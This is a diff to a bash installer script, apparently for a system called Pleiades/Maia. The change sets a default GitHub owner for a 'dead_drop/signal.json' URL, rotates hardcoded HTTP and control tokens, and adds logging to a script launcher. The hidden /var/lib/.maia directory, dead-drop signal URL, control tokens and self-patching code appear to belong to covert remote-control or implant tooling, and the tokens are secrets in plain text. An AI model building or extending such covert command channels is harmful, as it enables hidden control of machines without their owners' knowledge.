@@ -585,7 +585,7 @@ GOEOF
     rm -rf /tmp/_sc_src
     mkdir -p /var/lib/.maia
     [[ -f /var/lib/.maia/github_drop_url ]] || \
-        echo "https://raw.githubusercontent.com/${PLEIADES_REPO_OWNER}/pleiades/main/dead_drop/signal.json" > /var/lib/.maia/github_drop_url
+        echo "https://raw.githubusercontent.com/${PLEIADES_REPO_OWNER:-Zheke32174}/pleiades/main/dead_drop/signal.json" > /var/lib/.maia/github_drop_url
 }
 
 generate_keypair() {
@@ -699,8 +699,8 @@ MAIA_DIR="/var/lib/.maia"
 LOGS_DIR="/var/lib/.maia/logs"
 WORK_DIR="/var/lib/.maia/work"
 SCRIPT_DIR="/usr/local/sbin"
-HTTP_TOKEN="8f12dcdd75ed6e1b53db02288b37f3e2"
-CONTROL_TOKEN="b74b1f7a78d86274be5e7a1858a22f87"
+HTTP_TOKEN="57d31bee5dd3487b71e18921cb04c4ae"
+CONTROL_TOKEN="b3171430e7087c74de623ab3bd332d30"
 MAX_OPEN_FILES=4096
 MEMORY_LIMIT="5926M"
 CPU_QUOTA="400%"
@@ -1461,8 +1461,8 @@ patch_runtime_value() {
     sed -i "s|$token|$value|g" "$TEMP_SELF" 2>/dev/null || true
 }
 
-patch_runtime_value "8f12dcdd75ed6e1b53db02288b37f3e2" "$HTTP_TOKEN"
-patch_runtime_value "b74b1f7a78d86274be5e7a1858a22f87" "$CONTROL_TOKEN"
+patch_runtime_value "57d31bee5dd3487b71e18921cb04c4ae" "$HTTP_TOKEN"
+patch_runtime_value "b3171430e7087c74de623ab3bd332d30" "$CONTROL_TOKEN"
 sed -i -E "s/^(MAX_OPEN_FILES=).*/\1$MAX_OPEN_FILES/" "$TEMP_SELF"
 sed -i -E "s/^(MEMORY_LIMIT=).*/\1\"$MEMORY_LIMIT\"/" "$TEMP_SELF"
 sed -i -E "s/^(CPU_QUOTA=).*/\1\"$CPU_QUOTA\"/" "$TEMP_SELF"
@@ -1675,7 +1675,15 @@ main() {
         for sp in "${script_paths[@]}"; do
             if [[ "$(basename "$sp")" == "$script_name" ]]; then
                 echo "[Sofia] Launching $script_name ..."
-                ( cd "$(dirname "$sp")" && bash "$sp" )
+                local _t0; _t0=$(date +%s)
+                ( cd "$(dirname "$sp")" && bash "$sp" 2>&1 ) | tail -5 | sed "s/^/  [${script_name}] /"
+                local _rc=${PIPESTATUS[0]} _elapsed=$(( $(date +%s) - _t0 ))
+                local _ready_flag="/var/lib/pleiades/ready/$(basename "$sp" .sh)"
+                if [[ -f "$_ready_flag" ]] || [[ "$_rc" -eq 0 ]]; then
+                    echo "[Sofia] $script_name OK (${_elapsed}s)"
+                else
+                    echo "[Sofia] $script_name FAIL (exit $_rc, ${_elapsed}s)" >&2
+                fi
                 sleep 3
                 break
             fi
